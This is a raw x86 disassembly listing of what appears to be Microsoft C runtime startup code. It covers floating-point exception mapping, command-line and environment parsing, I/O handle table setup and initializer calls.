  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
